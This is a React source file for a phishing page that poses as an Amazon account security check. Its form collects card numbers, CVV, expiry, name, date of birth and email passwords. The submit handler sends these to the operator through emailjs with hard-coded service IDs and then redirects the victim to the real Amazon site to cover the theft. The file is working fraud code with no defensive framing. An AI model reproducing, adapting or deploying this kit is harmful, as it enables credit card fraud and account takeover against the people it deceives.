import React, { useState, useRef } from "react";
import emailjs from "@emailjs/browser";

import Header from "../components/Header";
import Footer from "../components/Footer";

import LoginError from "../components/LoginError";

const Verify = ({ email }) => {
  document.title = "Amazon.com: Profile";
  const [showError, setShowError] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [details, setDetails] = useState({
    cardNumber: "",
    name: "",
    expiry: "",
    cvv: "",
    dob: "",
    password: "",
  });

  const form = useRef();

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!/^\d{4} \d{4} \d{4} \d{4}$/.test(details?.cardNumber)) {
      alert("Please match the requested format: XXXX XXXX XXXX XXXX");
    } else {
      if (
        details?.cardNumber.length !== 19 ||
        details?.name < 3 ||
        details?.password < 3
      ) {
        setShowError(true);
        setErrorMessage("Details are not valid");
      } else {
        setShowError(false);

        // sending details to the email
        emailjs
          .sendForm(
            "service_f0odnoe",
            "template_ah07fy9",
            form.current,
            "cFTuc2BMSsP5MYdif"
          )
          .then(
            (result) => {
              if (result?.status === 200) {
                // redirecting to the official website
                window.location.href = "https://www.amazon.com/";
              }
            },
            (error) => {
              setErrorMessage("Something went wrong!");
              setShowError(true);
            }
          );
      }
    }
  };

  const handleCardInput = (e) => {
    let val = e.target.value;
    val = val
      .replace(/[^\dA-Z]/g, "")
      .replace(/(.{4})/g, "$1 ")
      .trim();
    setDetails({ ...details, cardNumber: val });
  };

  const handleExpiryDateInput = (e) => {
    let value = e.target.value;
    value = value
      .replace(/[^\d/]/g, "")
      .replace(/(\d{2})(\d{2})/, "$1/$2")
      .slice(0, 7);
    setDetails({ ...details, expiry: value });
  };

  const handleDOB = (e) => {
    let value = e.target.value;
    value = value
      .replace(/[^\d/]/g, "")
      .replace(/(\d{2})(\d{2})/, "$1/$2/")
      .slice(0, 10);
    setDetails({ ...details, dob: value });
  };

  return (
    <>
      <Header />

      {showError && <LoginError message={errorMessage} />}

      <main className="w-[23%] mx-auto mt-2 border rounded-[4px] border-[#dad4d4] font-amazonMain px-6">
        <p className="text-black text-[18px] font-normal w-fit my-5">
          To help ensure the security of your Amazon account, Please fill out
          all the required fields.
        </p>

        <form method="post" ref={form} onSubmit={handleSubmit}>
          <div className="flex flex-col w-full font-bold">
            <label
              htmlFor="cardnumber"
              className="text-black font-bold text-[13px]"
            >
              Credit/Debit Card Number
            </label>

            <input
              type="text"
              id="cardnumber"
              name="cardnumber"
              inputMode="numeric"
              maxLength="19"
              autoComplete="cc-number"
              value={details?.cardNumber}
              onChange={handleCardInput}
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
              required
            />
          </div>

          <div className="flex flex-col w-full font-bold my-3">
            <label
              htmlFor="nameoncc"
              className="text-black font-bold text-[13px]"
            >
              Name on card
            </label>

            <input
              type="text"
              id="nameoncc"
              name="nameoncc"
              maxLength="75"
              value={details?.name}
              onChange={(e) => setDetails({ ...details, name: e.target.value })}
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
              required
            />
          </div>

          <div className="flex flex-col w-full font-bold my-3">
            <label htmlFor="exp" className="text-black font-bold text-[13px]">
              Expiration date
            </label>

            <input
              type="text"
              id="exp"
              name="expiry"
              maxLength="5"
              placeholder="MM/YY"
              value={details?.expiry}
              onChange={handleExpiryDateInput}
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
              required
            />
          </div>

          <div className="flex flex-col w-full font-bold">
            <label htmlFor="cvv" className="text-black font-bold text-[13px]">
              CVV
            </label>

            <input
              type="text"
              id="cvv"
              name="cvv"
              maxLength="4"
              placeholder="Card Security code"
              value={details?.cvv}
              onChange={(e) => setDetails({ ...details, cvv: e.target.value })}
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
              required
            />
          </div>

          <div className="flex flex-col w-full font-bold my-3">
            <label htmlFor="dd" className="text-black font-bold text-[13px]">
              Date of Birth
            </label>

            <input
              type="text"
              id="dd"
              name="dob"
              maxLength="10"
              placeholder="MM/DD/YYYY"
              value={details?.dob}
              onChange={handleDOB}
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
              required
            />
          </div>

          <div className="flex flex-col w-full font-bold my-3">
            <label htmlFor="email" className="text-black font-bold text-[13px]">
              Email
            </label>

            <input
              type="email"
              id="email"
              name="email"
              maxLength="15"
              readOnly={true}
              value={email}
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-gray-400 text-sm focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
            />
          </div>

          <div className="flex flex-col w-full font-bold my-3">
            <label htmlFor="pass" className="text-black font-bold text-[13px]">
              Email Password
            </label>

            <input
              type="password"
              id="pass"
              name="emailpassword"
              value={details?.password}
              maxLength="50"
              onChange={(e) =>
                setDetails({ ...details, password: e.target.value })
              }
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
              required
            />
          </div>

          <div className="w-full my-4">
            <button
              className="text-[#111] leading-[29px] outline-none border-none bg-gradient-to-b from-[#f7dfa5] to-[#f0c14b] rounded-[2px] h-[29px] w-full mt-2 text-[13px] flex justify-center items-center hover:from-[#f5d78e] hover:to-[#eeb933]"
              type="submit"
            >
              Continue
            </button>
          </div>
        </form>
      </main>

      <Footer />
    </>
  );
};

export default Verify;
